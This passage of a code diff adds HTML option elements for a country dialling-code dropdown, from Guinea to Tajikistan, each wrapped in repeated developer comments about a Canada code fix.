+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=224>
+											Guinea
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=245>
+											Guinea-Bissau
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=592>
+											Guyana
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=509>
+											Haiti
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=504>
+											Honduras
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=852>
+											Hong Kong
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=36>
+											Hungary
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=354>
+											Iceland
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=62>
+											Indonesia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=871>
+											Inmarsat (Atl-East)
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=874>
+											Inmarsat (Atl-West)
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=873>
+											Inmarsat (Indian O.)
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=872>
+											Inmarsat (Pacific)
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=870>
+											Inmarsat SNAC
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=800>
+											Int&#039;l Freephone
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=98>
+											Iran
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=964>
+											Iraq
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=353>
+											Ireland
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=972>
+											Israel
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=39>
+											Italy/Vatican City
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=225>
+											Ivory Coast
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_JM>
+											JAMAICA
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=81>
+											Japan
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=962>
+											Jordan
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=7>
+											KAZAKHSTAN
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=254>
+											Kenya
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=686>
+											Kiribati
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=82>
+											Korea (South)
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=965>
+											Kuwait
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=996>
+											Kyrgyz Republic
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=856>
+											Laos
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=371>
+											Latvia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=961>
+											Lebanon
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=266>
+											Lesotho
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=231>
+											Liberia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=218>
+											Libya
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=423>
+											Liechtenstein
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=370>
+											Lithuania
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=352>
+											Luxembourg
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_MS>
+											MONTSERRAT
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=853>
+											Macau
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=389>
+											Macedonia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=261>
+											Madagascar
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=265>
+											Malawi
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=60>
+											Malaysia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=960>
+											Maldives
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=223>
+											Mali
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=356>
+											Malta
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=692>
+											Marshall Islands
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=596>
+											Martinique/French Antilles
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=222>
+											Mauritania
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=230>
+											Mauritius
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=269>
+											Mayotte, Comoros Is.
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=52>
+											Mexico
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=808>
+											Midway Island
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=373>
+											Moldova
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=377>
+											Monaco
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=976>
+											Mongolia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=212>
+											Morocco
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=258>
+											Mozambique
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=95>
+											Myanmar (Burma)
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=264>
+											Namibia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=674>
+											Nauru
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=977>
+											Nepal
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=31>
+											Netherlands
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=599>
+											Netherlands Antilles
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=869>
+											Nevis
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=687>
+											New Caledonia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=64>
+											New Zealand
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=505>
+											Nicaragua
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=227>
+											Niger
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=234>
+											Nigeria
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=683>
+											Niue
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=47>
+											Norway
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=968>
+											Oman
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=970>
+											PALESTINE
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=92>
+											Pakistan
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=680>
+											Palau
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=507>
+											Panama
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=675>
+											Papua New Guinea
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=595>
+											Paraguay
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=51>
+											Peru
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=63>
+											Philippines
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=48>
+											Poland
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=351>
+											Portugal
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=974>
+											Qatar
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=995>
+											Rep. of Georgia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=262>
+											Reunion Island
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=40>
+											Romania
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+										<option value=7>
+											Russia
+										</option>
+									
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=250>
+											Rwanda
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=239>
+											SAO TOME AND PRINCIPE
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=211>
+											SOUTH SUDAN
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=290>
+											Saint Helena
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_KN>
+											Saint Kitts and Nevis
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_LC>
+											Saint Lucia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=508>
+											Saint Pierre and Miquelon
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=1_VC>
+											Saint Vincent and the Grenadines
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=378>
+											San Marino
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=881>
+											Satellite services
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=966>
+											Saudi Arabia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=221>
+											Senegal
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=248>
+											Seychelles
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=232>
+											Sierra Leone
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=65>
+											Singapore
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=421>
+											Slovakia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=386>
+											Slovenia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=677>
+											Solomon Islands
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=252>
+											Somalia
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=27>
+											South Africa
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=34>
+											Spain
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=94>
+											Sri Lanka
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=249>
+											Sudan
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=597>
+											Suriname
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=268>
+											Swaziland
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=46>
+											Sweden
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=41>
+											Switzerland
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=963>
+											Syria
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=886>
+											Taiwan
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
+						<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Starts -->
+								
+									
+									
+																		
+										<option value=992>
+											Tajikistan
+										</option>
+									
+								
+								<!-- Included for URIB with canada code issue by Marikannan on 23-12-22 - Ends -->
+					    
